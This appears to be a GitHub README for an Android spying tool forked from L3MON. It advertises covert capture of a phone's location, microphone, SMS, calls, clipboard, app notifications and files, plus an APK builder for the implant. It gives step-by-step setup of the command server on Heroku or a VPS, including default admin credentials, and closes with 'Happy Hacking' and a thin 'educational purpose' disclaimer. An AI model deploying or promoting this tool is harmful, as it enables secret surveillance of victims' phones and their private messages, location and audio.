<p align="center">
<img src="https://github.com/vikashmobileclinic/AndroidSpyServer/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based Android Spying or Monitoring Tool, powered by NodeJS
</p>


## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 9+
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server 

## Installation on Heroku [Click Here](https://github.com/vikashmobileclinic/AndroidSpyServer/blob/herooku/README.md)

  Video Tutorial for Heroku [Click Here](https://youtu.be/IoJGFZWCPko)

## Installation on VPS or Server
 
 Video Tutorial for VPS or Server [Click Here](https://youtu.be/6bRs7-0AD04)

0. Connect to your server via SSH

1. Install JRE 9+ 
    - Debian, Ubuntu, Etc
        - `sudo apt install openjdk-11-jre-headless`
    - Fedora, Oracle, Red Hat, etc
        -  `sudo yum install java-11-openjdk-devel"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre9-downloads-3848532.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `sudo npm install pm2 -g`

4. Clone this repository
    - `git clone https://github.com/vikashmobileclinic/AndroidSpyServer.git`

5. Now change to the server directory and run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run XploitSPY on startup
    
6. Default Username : admin & Default Password : password

7. Change the Username & Password
    1. Stop VikashSPY `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

8. in your browser navigate to `http://<SERVER IP or URL
    
It's recommended to run VikashSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Happy Hacking

## Disclaimer
<b>VMCSpy Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
VMCSpy is built for Educational Purpose. Use at your own Risk.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://github.com/vikashmobileclinic/AndroidSpyServer">Mr.Chauhan</a></p>

## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>
